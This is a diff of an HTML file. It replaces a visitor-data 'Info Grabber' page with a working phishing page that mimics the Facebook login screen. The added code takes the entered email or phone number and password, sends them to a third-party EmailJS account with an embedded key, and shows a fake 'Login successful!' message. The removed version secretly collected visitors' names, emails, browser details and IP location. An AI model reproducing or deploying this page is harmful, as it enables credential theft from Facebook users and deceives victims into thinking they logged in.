@@ -1,61 +1,198 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>EmailJS Info Sender with Inputs</title>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    
+    body {
+      background-color: #f0f2f5;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    
+    .logo {
+      margin: 40px 0 20px;
+      color: #1877f2;
+      font-size: 40px;
+      font-weight: bold;
+    }
+    
+    .form-container {
+      width: 100%;
+      max-width: 400px;
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      margin-bottom: 20px;
+    }
+    
+    .form-field {
+      margin-bottom: 15px;
+    }
+    
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+    
+    .login-btn:hover {
+      background-color: #166fe5;
+    }
+    
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+    
+    .create-account-btn {
+      width: auto;
+      padding: 12px;
+      background-color: #42b72a;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 0 auto;
+      display: block;
+    }
+    
+    .create-account-btn:hover {
+      background-color: #36a420;
+    }
+    
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      color: #1c1e21;
+      font-size: 14px;
+    }
+    
+    .footer a {
+      color: #385898;
+      text-decoration: none;
+    }
+    
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    
+    .language-selector {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #737373;
+    }
+    
+    @media (max-width: 480px) {
+      .logo {
+        margin: 20px 0;
+        font-size: 32px;
+      }
+      
+      .form-container {
+        padding: 15px;
+      }
+      
+      input[type="text"],
+      input[type="password"],
+      .login-btn {
+        padding: 12px;
+      }
+    }
+  </style>
 </head>
 <body>
+  <div class="logo">facebook</div>
+  
+  <div class="form-container">
+    <form id="form">
+      <div class="form-field">
+        <input type="text" name="identifier" id="identifier" placeholder="Mobile number or email address" />
+      </div>
 
-<h2>Info Grabber (Educational Only)</h2>
+      <div class="form-field">
+        <input type="password" name="password" id="password" placeholder="Password" />
+      </div>
 
-<label>Full Name:</label>
-<input type="text" id="fullname"><br><br>
+      <button type="submit" class="login-btn">Log In</button>
+      
+      <div class="divider"></div>
+      
+      <button type="button" class="create-account-btn">Create New Account</button>
+    </form>
+  </div>
+  
+  <div class="footer">
+    <a href="#">Forgotten password?</a>
+  </div>
+  
+  <div class="language-selector">
+    English (UK)
+  </div>
 
-<label>Email:</label>
-<input type="email" id="useremail"><br><br>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    emailjs.init("JCXRpOY2fFf3lDLSO"); // Your EmailJS user ID
+  </script>
 
-<button onclick="sendInfo()">Send Info</button>
+  <script>
+    const btn = document.querySelector('.login-btn');
+    const form = document.getElementById('form');
 
-<script>
-  // Init EmailJS
-  (function() {
-    emailjs.init("YOUR_USER_ID_HERE"); // <<-- Replace this
-  })();
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
 
-  // Get IP info
-  async function getIpInfo() {
-    const res = await fetch("https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN"); // Optional token
-    return await res.json();
-  }
+      btn.textContent = 'Logging in...';
+      btn.disabled = true;
 
-  async function sendInfo() {
-    const ipData = await getIpInfo();
-
-    const name = document.getElementById("fullname").value;
-    const email = document.getElementById("useremail").value;
-
-    const data = {
-      fullname: name,
-      useremail: email,
-      browser: navigator.userAgent,
-      screen: `${screen.width}x${screen.height}`,
-      ip: ipData.ip,
-      city: ipData.city,
-      region: ipData.region,
-      country: ipData.country,
-    };
-
-    emailjs.send("service_eld8eqy", "template_31sd9v5", data)
-    .then(res => {
-      console.log("Sent!", res.status);
-      alert("Info sent successfully.");
-    })
-    .catch(err => {
-      console.error("Error sending:", err);
-      alert("Failed to send info.");
+      emailjs.sendForm('default_service', 'template_31sd9v5', this)
+        .then(() => {
+          btn.textContent = 'Log In';
+          btn.disabled = false;
+          alert('Login successful!');
+        }, (err) => {
+          btn.textContent = 'Log In';
+          btn.disabled = false;
+          alert('Error: ' + JSON.stringify(err));
+        });
     });
-  }
-</script>
-
+  </script>
 </body>
 </html>
